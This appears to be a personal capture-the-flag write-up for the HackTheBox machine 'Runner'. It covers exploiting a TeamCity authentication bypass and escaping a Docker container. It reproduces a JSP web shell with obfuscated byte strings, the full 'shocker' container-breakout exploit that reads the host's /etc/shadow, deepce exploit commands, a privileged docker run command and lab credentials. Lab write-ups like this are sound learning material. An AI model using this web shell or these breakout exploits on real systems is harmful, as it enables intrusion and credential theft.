# Anomalies : Runner Writeup

Name: Runner
Date:  
Difficulty:  Medium
Goals:  

Learnt:
- Too reliant on "*assumed*" good wordlist 
Beyond Root:
- `diff` all wordlists and make master wordlists per vector
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Runner/Screenshots/ping.png)

`nmap -sV -sC` enumerated these services and versions:
![](ubuntusshversion-runnerhostname-nagios.png)


The IppSec Special: [https://launchpad.net/ubuntu/+source/openssh/1:8.9p1-3ubuntu0.6](https://launchpad.net/ubuntu/+source/openssh/1:8.9p1-3ubuntu0.6)
![](ippsecsshubuntuspecial.png)

It is a Ubuntu Jammy box, my favourite word hear Scottish people say.
![](getascottishpersontosayJAMMY.png)

[https://packages.ubuntu.com/jammy/dpkg](https://packages.ubuntu.com/jammy/dpkg) - for later reference in case of a vulnerability in the underlying c packages on the JAMMY box.
![](jammy-dpkg-versiontocrosscomparewithsnyk.png)

And I saw both Ubuntu Jammy and nginx - so another helped-through to bang out
![](anotherhelped-through.png)

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
![](www-root-80.png)

Brute force enumeration of options as I went down the very, very long list of vulnerabilities for nginx 1.18 from [snyk](https://snyk.io/test/docker/nginx%3A1.18)
![](optionsthebruteforcewayfor-curllibexploitcheck.png)


[Nagios NSCA](https://exchange.nagios.org/directory/Addons/Passive-Checks/NSCA--2D-Nagios-Service-Check-Acceptor/details) - Nagios Service Check Acceptor
![](curlnagiosversionquestionmark.png)

![](nagiosnotfoundacceptor.png)

Took the search-engine dork bait for potential similar exploit chains - enjoy the helped-thorough
![](tookthehitandlookedforsimiliarlog4j.png)

Learnt of [welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit) *"JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability, like Jackson, Fastjson, etc)"* and pimps fork [https://github.com/pimps/JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) *"JNDI-Exploitation-Kit（A modified version of the great JNDI-Injection-Exploit created by @welk1n. This tool can be used to start an HTTP Server, RMI Server and LDAP Server to exploit java web apps vulnerable to JNDI Injection）"*

Hint from the team - hostname of teamcity
![](teamcity.png)

![](jhaddixwordlists-teamcity.png)


![](nucleitheteamcity.png)

![](limitedadminactionspossible.png)


- https://raw.githubusercontent.com/W01fh4cker/CVE-2024-27198-RCE/main/CVE-2024-27198-RCE.py


```java
  evil_plugin_jsp = r"""<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<%
    String op="";
    String query = request.getParameter("cmd");
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }
    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>
<%= op %>
"""
```

What these bytes and doing our due diligence:
![](uint8thebyteis.png)

https://www.programiz.com/java-programming/online-compiler/
https://learnxinyminutes.com/docs/java/
![](binbashinthejavabytes.png)

Install faker python module for Kali and probably Parrot
```bash
apt install faker
```

![](nol;inuxcommandsthough.png)

![](glandthanksforallthecreds.png)
There is CLI script running because why not:
https://www.jetbrains.com/teamcity/tutorials/general/running-command-line-scripts/

```
s6hq4rmy : f8jWYWEFxo
```

[A shell for Team](https://www.youtube.com/watch?v=XRPUoz1TYro) the best [A Team (best scene in a reboot ever)](https://www.youtube.com/watch?v=IhdEKY1b0tk)
![](teamshellteams.png)


John and Matthew users
![](matthewisonthebox.png)

![](buildconfteamteamteam.png)

Skip to the build steps
![](cliexecution.png)

![](attempt1.png)

![](nocompatibleagents.png)

![](nolocallyinstalledagentsontherunnerbox.png)

[We need more POWER](https://www.youtube.com/watch?v=sFGmhvx1elk) 
![](MOREPOWER.png)

Aftrer scrolling down
![](butwehavethemalready.png)

Before reading more documentation I decided to read about the CVE more:
[rapid7](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)
![](rapid7rapidingmyuserpoints.png)

no vhost, rhost: teamcity.runner.htb
![](cve-224-27198.png)


![](succesfulmsfexploit.png)

[Container foothold](https://www.youtube.com/watch?v=EWSp5ijOOfk)
![](weareinadockercontainer.png)

Ran deepce
![](deepceran.png)

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#capabilities-in-docker-containers

![](containercapabilities.png)

https://tbhaxor.com/container-breakout-part-2/ references labs for 
https://attackdefense.com/challengedetailsnoauth?cid=1459 and a solution from  
https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3, which in turn references:

https://stealth.openwall.net/xSports/shocker.c
```c
/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer
 *
 * Demonstrates that any given docker image someone is asking
 * you to run in your docker setup can access ANY file on your host,
 * e.g. dumping hosts /etc/shadow or other sensitive info, compromising
 * security of the host and any other docker VM's on it.
 *
 * docker using container based VMM: Sebarate pid and net namespace,
 * stripped caps and RO bind mounts into container's /. However
 * as its only a bind-mount the fs struct from the task is shared
 * with the host which allows to open files by file handles
 * (open_by_handle_at()). As we thankfully have dac_override and
 * dac_read_search we can do this. The handle is usually a 64bit
 * string with 32bit inodenumber inside (tested with ext4).
 * Inode of / is always 2, so we have a starting point to walk
 * the FS path and brute force the remaining 32bit until we find the
 * desired file (It's probably easier, depending on the fhandle export
 * function used for the FS in question: it could be a parent inode# or
 * the inode generation which can be obtained via an ioctl).
 * [In practise the remaining 32bit are all 0 :]
 *
 * tested with docker 0.11 busybox demo image on a 3.11 kernel:
 *
 * docker run -i busybox sh
 *
 * seems to run any program inside VMM with UID 0 (some caps stripped); if
 * user argument is given, the provided docker image still
 * could contain +s binaries, just as demo busybox image does.
 *
 * PS: You should also seccomp kexec() syscall :)
 * PPS: Might affect other container based compartments too
 *
 * $ cc -Wall -std=c99 -O2 shocker.c -static
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>


struct my_file_handle {
	unsigned int handle_bytes;
	int handle_type;
	unsigned char f_handle[8];
};



void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


void dump_handle(const struct my_file_handle *h)
{
	fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
	        h->handle_type);
	for (int i = 0; i < h->handle_bytes; ++i) {
		fprintf(stderr,"0x%02x", h->f_handle[i]);
		if ((i + 1) % 20 == 0)
			fprintf(stderr,"\n");
		if (i < h->handle_bytes - 1)
			fprintf(stderr,", ");
	}
	fprintf(stderr,"};\n");
}


int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
	int fd;
	uint32_t ino = 0;
	struct my_file_handle outh = {
		.handle_bytes = 8,
		.handle_type = 1
	};
	DIR *dir = NULL;
	struct dirent *de = NULL;

	path = strchr(path, '/');

	// recursion stops if path has been resolved
	if (!path) {
		memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
		oh->handle_type = 1;
		oh->handle_bytes = 8;
		return 1;
	}
	++path;
	fprintf(stderr, "[*] Resolving '%s'\n", path);

	if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
		die("[-] open_by_handle_at");

	if ((dir = fdopendir(fd)) == NULL)
		die("[-] fdopendir");

	for (;;) {
		de = readdir(dir);
		if (!de)
			break;
		fprintf(stderr, "[*] Found %s\n", de->d_name);
		if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
			fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
			ino = de->d_ino;
			break;
		}
	}

	fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");


	if (de) {
		for (uint32_t i = 0; i < 0xffffffff; ++i) {
			outh.handle_bytes = 8;
			outh.handle_type = 1;
			memcpy(outh.f_handle, &ino, sizeof(ino));
			memcpy(outh.f_handle + 4, &i, sizeof(i));

			if ((i % (1<<20)) == 0)
				fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
			if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
				closedir(dir);
				close(fd);
				dump_handle(&outh);
				return find_handle(bfd, path, &outh, oh);
			}
		}
	}

	closedir(dir);
	close(fd);
	return 0;
}


int main()
{
	char buf[0x1000];
	int fd1, fd2;
	struct my_file_handle h;
	struct my_file_handle root_h = {
		.handle_bytes = 8,
		.handle_type = 1,
		.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
	};

	fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014             [***]\n"
	       "[***] The tea from the 90's kicks your sekurity again.     [***]\n"
	       "[***] If you have pending sec consulting, I'll happily     [***]\n"
	       "[***] forward to my friends who drink secury-tea too!      [***]\n\n<enter>\n");

	read(0, buf, 1);

	// get a FS reference from something mounted in from outside
	if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
		die("[-] open");

	if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
		die("[-] Cannot find valid handle!");

	fprintf(stderr, "[!] Got a final handle!\n");
	dump_handle(&h);

	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
		die("[-] open_by_handle");

	memset(buf, 0, sizeof(buf));
	if (read(fd2, buf, sizeof(buf) - 1) < 0)
		die("[-] read");

	fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);

	close(fd2); close(fd1);

	return 0;
}



```

`docker breakout` as a search-engine dork term

There is also no `gcc`, `clang`
```
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>
```

Given the days left for this box some debugging in the clumsy way  is in order; a better way would be meticulously going thorough each dependencies to find the ones. Another lazy alternative would be  exfilitrating the entire lib directory
![](manuallyandclumslyblunderingdebuging.png)


![](sososososSOthisversionwilldo.png)

Compile from a specific .so library; from Kinkle's asnwer to https://www.linuxquestions.org/questions/linux-software-2/gcc-link-to-a-different-libc-file-804759/
```bash
gcc -s libc-2.31.so shocker.c -o shocker
```

![](noshockerdockerexploit.png)

- mknod: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod
- None of my ideas the below are possible as socket is not exploitable
	- `./deepce.sh --no-enumeration -e SOCK -l -i 10.10.10.10 -p 8443`
	- `./deepce.sh --no-enumeration -e SOCK -l -i 10.10.10.10 -p 8443` & `socat` relay
	- `./deepce.sh --no-enumeration --exploit SOCK -cmd "$base46 | bash"` - try first
	- `./deepce.sh --no-enumeration --exploit SOCK --shadow`
	-  `./deepce.sh --no-enumeration --exploit SOCK --username r00t --password r00t`
 
 Private Keys for John, which I forgot to take a screenshot of, but remembered, but it the teamcity id_rsa on the server was not the one I saw John have to that may have been patched

![](findingidrsa.png)

![](idrsa.png)

![](footholdwithjohn.png)

Managing ssh keys is rough, but reuse is bad.

Because there is docker on the system we can just make our own container as a bridge to root though the use of a privileged container, but we are not in the docker group.

![](portaineradministrationhostname.png)

![](moreportainer.png)

John to Matthew or a Johns password for `sudo -l `
- check configs - none

Portainer 2.19.4 does not have immediately dorkable exploits 
- https://docs.portainer.io 
- Where is the portainer database?

Portainer directory:
- Docker, Kubectl 

![](kube.png)

I was way too far ahead I got hint from the team that their is a backup file on the teamcity vhost

![](getthebackup.png)

![](backupreport.png)

```
mkdir teamcity-backup
mv $backup.zip teamcity-backup/
chmod -R +r teamcity-backup
cd teamcity-backup/ && unzip  $backup.zip 
```

![](hashtpcrack.png)

![](piper123.png)

![](passwordreusecheckfailed.png)

![](portainernoncontaino.png)

Docker store images locally: https://earthly.dev/blog/docker-image-storage-on-host/#:~:text=By%20default%2C%20Docker%20uses%20the,different%20directories%20or%20file%20systems.
```
/var/lib/docker/overlay2
```

Trying the most soft docker container 
```bash
--rm -it --pid=host --privileged --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host
```

![](rootonToroot.png)

Although this was probably a good idea, my team mate fromtheoaks used a working directory 
![](dirtohostworkingdirectory.png)
I forgot to add the user in haste

## Foothold

## Privilege Escalation

## Post Root Reflection

- Three hints:
	- Hostname - more wordlists
	- Backup on teamcity - did not check
	- Misconfiguring Portainer - ran out of time - but was half right as I needed my soft docker container command 
## Beyond Root

- `diff` all wordlists and make master wordlists per vector
- zero metasploit the box